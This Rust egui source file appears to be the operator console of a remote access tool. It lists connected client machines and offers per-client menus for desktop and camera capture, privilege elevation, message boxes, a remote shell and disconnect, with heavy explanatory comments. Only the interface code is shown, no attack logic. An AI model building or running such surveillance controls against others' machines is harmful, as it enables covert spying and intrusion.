use crate::{
    manager::types::UiManagerCommand,
    ui::{client::ClientView, view::View, windows},
};
use egui::{
    Align, Frame, Id, Label, Layout, Popup, RichText, ScrollArea, Sense, TextStyle, Ui, vec2,
};
use egui_extras::{Column, TableBuilder};
use shared::commands::Command;

// we render a dropdown for each client, we pass in each client's unique state
// so we can access the data. we need the UI variable to render to the viewport
fn menu(view: &mut ClientView, ui: &mut Ui) -> () {
    ui.label(view.info.hostname.clone()); // just so we know what client we will be opening a window for
    //                                     yes we can definitely afford to clone it lol

    ui.menu_button("🔍  Surveillance", |ui| { // displays as a category within the dropdown
        if ui.button("🖵  Desktop").clicked() { // the box is an emoji that isn't loading
        //                                        with the font used by VS code
            view.state // for this client,
                .windows // out of all the windows that we can open,
                .screen // get the display capture window,
                .store(true, std::sync::atomic::Ordering::Relaxed);
                // set its state to 'true' to open it using store(),
                // letting us change the atomic bool's state (needed because it's shared between threads)
        };
        if ui.button("📸  Camera").clicked() {
            view.state
                .windows
                .camera // get the camera capture window instead
                .store(true, std::sync::atomic::Ordering::Relaxed); // true = window should be open
        };
    });
    ui.menu_button("🗁  Utility", |ui| { // 'Utility' category within the dropdown
        ui.add_enabled_ui(!view.elevated, |ui| { // only allow things within this block to be clicked
                                                // in the case that the client isn't elevated.
            if ui.button("🛡  Elevate").clicked() {

                // 'let _' disregards the result, because we don't need it
                // use the unique channel between the client UI and the UI manager
                // ...to send a command to the main manager thread
                let _ = view.sender.send(UiManagerCommand::SendCommand(
                    view.mutex.clone(), // clone to copy and send as argument.
                    //  we don't want to pass the mutex or it'll be moved and we can't use it again.
                    Command::Elevate, // enumerator of the kind of command we want to run.
                ));
            };
        });
        if ui.button("💬  MessageBox").clicked() {
            view.state
                .windows
                .message_box // get the message box popup window
                .store(true, std::sync::atomic::Ordering::Relaxed); // display it by setting its state to true
        };
        if ui.button("🗖  Shell").clicked() {
            view.state
                .windows
                .shell // get the shell window state
                .store(true, std::sync::atomic::Ordering::Relaxed); // set to true to open the window
        };
    });
    ui.menu_button("🛜 Connection", |ui| { // seperate category for connection
        if ui.button("✖  Disconnect").clicked() { // disconnects the client when clicked
            let _ = view
                .sender
                .send(UiManagerCommand::SendCommand(view.mutex.clone(), Command::Disconnect));
            // ^ once again, use the client's unique channel to tell the UI to send a message to the manager
            // ...saying disconnect our client, here's our mutex, please disconnect us.
        };
    });
}

// we take our View state as an argument so we can access data that we need to change
// we also need the UI variable offered by egui to render things onto the viewport
pub fn render(view: &mut View, ui: &mut Ui) -> () {
    ui.heading("Sessions"); // add a heading for the page

    // using the horizontal() function allows us to put elements on the same row
    // this was originally used because there was status text but it wasn't needed
    // ...because the button switches its own text between states.
    ui.horizontal(|ui| match view.state.listening {
        false => { // if the listening state of the server is set to false
            if ui.button("▶  Listen").clicked() { // display a button that will activate listening
                let _ = view
                    .mouthpiece // get our mouthpiece that allows communication between
                    .to_server // the UI and the server
                    .send(crate::types::UiMessage::Listen); // tell the server to start listening
            }
        }
        true => { // if the listening state is set to true
            if ui.button("⏹  Stop").clicked() { // show a button that will STOP listening instead
                let _ = view
                    .mouthpiece // get server <---> UI mouthpiece
                    .to_server
                    .send(crate::types::UiMessage::Shutdown); // send shutdown enum message
            }
        }
    });

    ui.add_space(6.0); // padding to make the UI look nice

    TableBuilder::new(ui) // create a table to display our clients in, using the 'egui_extras' library
        .column(Column::auto().at_least(128.0)) // Mutex
        .column(Column::auto().at_least(128.0)) // Hostname
        .column(Column::auto().at_least(128.0)) // Address
        .header(24.0, |mut header| { // bold text that indicates what each column is
            header.col(|ui| {
                ui.strong("Mutex");
            });
            header.col(|ui| {
                ui.strong("Hostname");
            });
            header.col(|ui| {
                ui.strong("Socket");
            });
        })
        .body(|mut body| { // real content of table
            //                      iterate through each connected client
            // we only need the client data, not the index of the client within the array
            for (_i, mut client) in view.state.clients.iter_mut().enumerate() {
                body.row(24.0, |mut row| { // 24.0 is the height of each row
                    row.col(|ui| {

                        let sense = Sense::click(); // egui feature allowing us to detect clicks on labels
                        //                             this is how we'll show the dropdown menu

                        // we create a Label, add our click Sense to it,
                        // and store it in a variable so we can attach a dropdown
                        let response = ui.add(Label::new(client.1.mutex.clone()).sense(sense));

                        Popup::menu(&response) // add this Popup menu to the label we made
                            .id(Id::new(format!("menu_{}", client.1.mutex))) // unique identifier so we can have multiple without conflicts, see below
                            // changed from static "menu" string to unique string to open context menu per client
                            .show(|ui| menu(&mut client.1, ui));

                        Popup::context_menu(&response) // display the same menu on right click as well.
                        // it will look the same, but context_menu only appears on right click, menu on left.
                            .id(Id::new(format!("ctx_menu_{}", client.1.mutex))) // different ID is needed to prevent conflict
                            .show(|ui| menu(&mut client.1, ui));

                    });
                    row.col(|ui| {
                        ui.label(&client.1.info.hostname); // for each client, display its hostname
                    });
                    row.col(|ui| {
                        ui.label(&client.1.socket); // ...and its address (IP:port) in a row.
                    });
                });
            }
        });
    
    // also for each client connected...
    for (_i, client) in view.state.clients.iter_mut().enumerate() {
        // we need to keep track of what windows we should have open.
        windows::render(client.1, ui); // this logic is handled in a seperate file
    }

    ui.with_layout(Layout::top_down(Align::Min), |ui| { // anchored to the bottom of the window,
        let size = ui.available_size() - vec2(16.0, 16.0); // with padding, otherwise it looks ugly
        Frame::new() // wrap textbox in a frame so we can have background and padding/margin
            .fill(ui.visuals().faint_bg_color)
            .corner_radius(8.0) // corner radius looks nicer than a plain square box
            .inner_margin(6.0) // padding between the text and the edge of the frame
            .show(ui, |ui| {
                ui.set_min_size(size); // make sure the box won't get resized
                ScrollArea::vertical() // make sure the box is scrollable
                    .auto_shrink([false, false]) // do not change the size at all!
                    .stick_to_bottom(true) // scroll to bottom to simulate terminal output feeling
                    .show(ui, |ui| {
                        ui.label(
                            // get server logs, consolidate into one string joined by newlines. display as an egui RichText
                            RichText::new(&view.state.logs.server.join("\n"))
                                .monospace() // monospace is more readable for logs
                                .size(12.0) // allows more logs to fit
                                .color(ui.visuals().text_color())
                                .text_style(TextStyle::Monospace), // again, monospace
                        )
                    })
            })
    });
}
